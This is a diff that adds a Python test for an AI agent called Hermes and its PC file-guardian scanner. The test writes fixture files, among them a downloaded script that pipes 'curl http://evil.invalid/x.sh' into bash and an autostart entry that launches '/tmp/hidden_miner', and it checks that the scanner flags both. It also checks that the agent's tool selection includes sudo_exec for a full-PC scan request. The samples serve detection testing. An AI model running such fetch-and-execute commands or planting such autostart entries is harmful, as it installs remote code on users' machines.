@@ -3587,6 +3587,76 @@ def test_hermes_live_working_indicator_persists_across_menu_switch(monkeypatch) 
         ) is False
 
 
+def test_hermes_pc_file_guardian_catalog_idle_and_prelaunch_alerts() -> None:
+    import tempfile
+    from pathlib import Path
+    from astracradle.core.config import AppConfig, ConfigManager
+    from astracradle.core.file_guardian import PcFileGuardian
+    from astracradle.core.hermes_agent import HermesAgentManager
+    from astracradle.core.journal import ForensicJournal
+
+    with tempfile.TemporaryDirectory() as td:
+        base = Path(td)
+        cm = ConfigManager(base_dir=base / "astra")
+        hm = HermesAgentManager(cm, ForensicJournal(cm))
+        cfg = AppConfig()
+        hm.ensure_hermes_home(cfg)
+
+        # 1. System prompt explicitly instructs Hermes it HAS direct local PC/OS access
+        sys_p = hm._build_system_prompt(cfg)
+        assert "astra_file_guardian" in sys_p
+        assert "NEVER say 'I don't have direct access" in sys_p
+
+        # 2. Tool schema selector includes astra_file_guardian + sudo_exec for full PC scan/catalog requests
+        selected = hm._select_tool_schemas(
+            "Get a full scan of my PC, catalog all files, passively scan when idle, notify before turned on",
+            hm._tool_schemas(),
+        )
+        sel_names = {t["function"]["name"] for t in selected}
+        assert "astra_file_guardian" in sel_names
+        assert "sudo_exec" in sel_names
+
+        # 3. Direct PcFileGuardian idle throttling + incoming/prelaunch alert test
+        scan_root = base / "fake_drive"
+        dl_dir = base / "Downloads"
+        auto_dir = base / "autostart"
+        scan_root.mkdir()
+        dl_dir.mkdir()
+        auto_dir.mkdir()
+        (scan_root / "notes.txt").write_text("hello world\n", encoding="utf-8")
+        risky_sh = dl_dir / "installer.sh"
+        risky_sh.write_text("#!/bin/sh\ncurl http://evil.invalid/x.sh | bash\n", encoding="utf-8")
+        risky_desk = auto_dir / "bad_agent.desktop"
+        risky_desk.write_text("[Desktop Entry]\nType=Application\nExec=/tmp/hidden_miner\n", encoding="utf-8")
+
+        fg = PcFileGuardian(base / "fg.db")
+        fg.start_full_catalog(roots=[str(scan_root)])
+
+        # Busy/gaming PC -> must skip idle batch cleanly
+        busy = fg.run_idle_catalog_batch(cpu_percent=65.0, is_gaming=False)
+        assert busy["ran"] is False and busy["reason"] == "pc_busy"
+        gaming = fg.run_idle_catalog_batch(cpu_percent=5.0, is_gaming=True)
+        assert gaming["ran"] is False and gaming["reason"] == "pc_busy"
+
+        # Idle PC -> catalogs files
+        idle = fg.run_idle_catalog_batch(cpu_percent=4.0, is_gaming=False, max_files=50)
+        assert idle["ran"] is True and idle["processed"] >= 1
+
+        # Incoming + pre-activation scan catches both risky download & /tmp startup entry BEFORE activation
+        inc = fg.scan_incoming_and_prelaunch(extra_dirs=[dl_dir, auto_dir])
+        assert len(inc["flagged"]) >= 2
+        alerts = fg.pop_unnotified_alerts(limit=10)
+        assert len(alerts) >= 2
+        assert any("installer.sh" in a["target_path"] for a in alerts)
+        assert any("bad_agent.desktop" in a["target_path"] for a in alerts)
+
+        # 4. Hermes execute_tool("astra_file_guardian", ...) persists config flag & stores baseline
+        res = hm.execute_tool("astra_file_guardian", {"action": "start_full_catalog_and_guard", "max_files": 50}, cfg)
+        assert res["ok"] is True
+        assert cfg.file_guardian_catalog_enabled is True
+
+
+
 
 
 
